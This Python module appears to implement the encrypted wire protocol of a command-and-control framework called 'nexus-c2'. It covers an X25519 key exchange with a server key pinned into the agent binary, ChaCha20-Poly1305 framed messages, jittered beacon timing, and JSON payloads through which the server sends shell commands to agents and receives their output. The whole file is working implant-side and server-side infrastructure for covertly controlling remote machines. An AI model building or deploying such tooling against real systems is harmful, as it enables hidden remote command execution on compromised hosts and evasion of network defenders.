import json
import os
import random
import time

from cryptography.exceptions import InvalidTag  # noqa: F401 – callers import this
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat, PrivateFormat, NoEncryption

# ── Message types ──────────────────────────────────────────────────────────────
MSG_HELLO   = 0x01
MSG_WELCOME = 0x02
MSG_BEACON  = 0x03
MSG_TASK    = 0x04
MSG_RESULT  = 0x05
MSG_NOP     = 0x06
MSG_ERROR   = 0x07

MSG_NAMES = {
    MSG_HELLO:   "HELLO",
    MSG_WELCOME: "WELCOME",
    MSG_BEACON:  "BEACON",
    MSG_TASK:    "TASK",
    MSG_RESULT:  "RESULT",
    MSG_NOP:     "NOP",
    MSG_ERROR:   "ERROR",
}

_HKDF_INFO   = b"nexus-c2-v1-session-key"
_SALT_LEN    = 16
_SESSION_LEN = 32

INTERVALO_BASE = 5.0
JITTER_MAX     = 3.0


# ── Clear-frame codec (Fases 1–2, no crypto) ──────────────────────────────────
# Layout: [TYPE 1B][PAYLOAD]

def pack_clear(msg_type: int, payload: bytes = b"") -> bytes:
    return bytes([msg_type]) + payload


def unpack_clear(raw: bytes) -> tuple[int, bytes]:
    if not raw:
        raise ValueError("empty frame")
    return raw[0], raw[1:]


def esperar_beacon() -> None:
    """Sleep INTERVALO_BASE + uniform(0, JITTER_MAX) before next beacon."""
    time.sleep(INTERVALO_BASE + random.uniform(0, JITTER_MAX))


# ── Nonce counter ──────────────────────────────────────────────────────────────

class NonceCounter:
    """Thread-unsafe 12-byte little-endian counter. start=0 → server (even), start=1 → agent (odd)."""
    def __init__(self, start: int):
        self._value = start

    def next(self) -> bytes:
        n = self._value
        self._value += 2
        return n.to_bytes(12, "little")


# ── Internal helpers ───────────────────────────────────────────────────────────

def _raw_pub(key) -> bytes:
    return key.public_bytes(Encoding.Raw, PublicFormat.Raw)


def _derive_key(shared: bytes, salt: bytes, agent_pub: bytes, server_pub: bytes) -> bytes:
    return HKDF(
        algorithm=SHA256(),
        length=32,
        salt=salt,
        info=_HKDF_INFO + agent_pub + server_pub,
    ).derive(shared)


# ── Frame codec ────────────────────────────────────────────────────────────────

def build_frame(msg_type: int, plaintext: bytes, chacha: ChaCha20Poly1305, nc: NonceCounter) -> bytes:
    """Encrypt plaintext and return [TYPE 1B][NONCE 12B][CIPHERTEXT+TAG]."""
    nonce = nc.next()
    return bytes([msg_type]) + nonce + chacha.encrypt(nonce, plaintext, None)


def parse_frame(raw: bytes, chacha: ChaCha20Poly1305) -> tuple[int, bytes]:
    """Decrypt frame. Raises InvalidTag on tampering. Returns (msg_type, plaintext)."""
    msg_type = raw[0]
    nonce    = raw[1:13]
    plaintext = chacha.decrypt(nonce, raw[13:], None)
    return msg_type, plaintext


# ── Handshake ─────────────────────────────────────────────────────────────────

def agent_handshake(server_static_pub_bytes: bytes) -> tuple[bytes, X25519PrivateKey, bytes]:
    """
    Generate agent ephemeral keypair and build HELLO frame.
    Returns (hello_frame, agent_priv, agent_pub_bytes).
    server_static_pub_bytes is embedded in the agent binary (key pinning).
    """
    agent_priv = X25519PrivateKey.generate()
    agent_pub  = _raw_pub(agent_priv.public_key())
    return bytes([MSG_HELLO]) + agent_pub, agent_priv, agent_pub


def server_process_hello(
    hello_raw: bytes,
    server_static_priv: X25519PrivateKey,
) -> tuple[bytes, bytes, bytes, ChaCha20Poly1305, NonceCounter]:
    """
    Process HELLO, derive session_key, build WELCOME frame.
    Returns (welcome_frame, session_id, session_key, chacha, server_nonce_counter).
    """
    if len(hello_raw) < 33:
        raise ValueError(f"HELLO too short: {len(hello_raw)} bytes (expected 33)")
    if hello_raw[0] != MSG_HELLO:
        raise ValueError(f"Expected HELLO (0x01), got 0x{hello_raw[0]:02x}")

    agent_pub_bytes = hello_raw[1:33]
    agent_pub       = X25519PublicKey.from_public_bytes(agent_pub_bytes)
    server_pub_bytes = _raw_pub(server_static_priv.public_key())

    shared     = server_static_priv.exchange(agent_pub)
    salt       = os.urandom(_SALT_LEN)
    session_key = _derive_key(shared, salt, agent_pub_bytes, server_pub_bytes)
    session_id  = os.urandom(_SESSION_LEN)

    welcome = (
        bytes([MSG_WELCOME])
        + server_pub_bytes          # 32 B
        + salt                      # 16 B
        + bytes([len(session_id)])  # 1 B  (always 32)
        + session_id                # 32 B
    )
    chacha = ChaCha20Poly1305(session_key)
    return welcome, session_id, session_key, chacha, NonceCounter(0)


def agent_process_welcome(
    welcome_raw: bytes,
    agent_priv: X25519PrivateKey,
    agent_pub_bytes: bytes,
    expected_server_pub: bytes | None = None,
) -> tuple[bytes, bytes, ChaCha20Poly1305, NonceCounter]:
    """
    Process WELCOME and derive the same session_key the server computed.
    Returns (session_id, session_key, chacha, agent_nonce_counter).
    Raises ValueError if key pinning fails (expected_server_pub mismatch).
    """
    if len(welcome_raw) < 82:  # 1 + 32 + 16 + 1 + 32
        raise ValueError(f"WELCOME too short: {len(welcome_raw)} bytes (expected ≥82)")
    if welcome_raw[0] != MSG_WELCOME:
        raise ValueError(f"Expected WELCOME (0x02), got 0x{welcome_raw[0]:02x}")

    server_pub_bytes = welcome_raw[1:33]
    if expected_server_pub is not None and server_pub_bytes != expected_server_pub:
        raise ValueError("Server public key mismatch — possible MITM attack")
    salt             = welcome_raw[33:49]
    sid_len          = welcome_raw[49]
    session_id       = welcome_raw[50:50 + sid_len]

    server_pub  = X25519PublicKey.from_public_bytes(server_pub_bytes)
    shared      = agent_priv.exchange(server_pub)
    session_key = _derive_key(shared, salt, agent_pub_bytes, server_pub_bytes)

    chacha = ChaCha20Poly1305(session_key)
    return session_id, session_key, chacha, NonceCounter(1)


# ── Payload helpers (JSON ↔ bytes) ─────────────────────────────────────────────

def encode_beacon(agent_id: str, hostname: str = "", os_name: str = "", ts: int = 0) -> bytes:
    return json.dumps({"agent_id": agent_id, "hostname": hostname, "os": os_name, "ts": ts}).encode()

def decode_beacon(payload: bytes) -> dict:
    return json.loads(payload)

def encode_task(task_id: str, cmd: str, timeout_s: int = 30) -> bytes:
    return json.dumps({"task_id": task_id, "cmd": cmd, "timeout_s": timeout_s}).encode()

def decode_task(payload: bytes) -> dict:
    return json.loads(payload)

def encode_result(task_id: str, exit_code: int, stdout: str, stderr: str, agent_id: str = "") -> bytes:
    return json.dumps({"agent_id": agent_id, "task_id": task_id, "exit_code": exit_code, "stdout": stdout, "stderr": stderr}).encode()

def decode_result(payload: bytes) -> dict:
    return json.loads(payload)


# ── Server keypair persistence ─────────────────────────────────────────────────

def generate_server_keypair() -> tuple[X25519PrivateKey, bytes]:
    """Generate and return (private_key, public_key_bytes)."""
    priv = X25519PrivateKey.generate()
    return priv, _raw_pub(priv.public_key())

def get_pub_bytes(priv: X25519PrivateKey) -> bytes:
    """Return the raw 32-byte public key for a private key."""
    return _raw_pub(priv.public_key())

def save_server_key(priv: X25519PrivateKey, path: str) -> None:
    raw = priv.private_bytes(Encoding.Raw, PrivateFormat.Raw, NoEncryption())
    with open(path, "wb") as f:
        f.write(raw)

def load_server_key(path: str) -> X25519PrivateKey:
    with open(path, "rb") as f:
        return X25519PrivateKey.from_private_bytes(f.read())
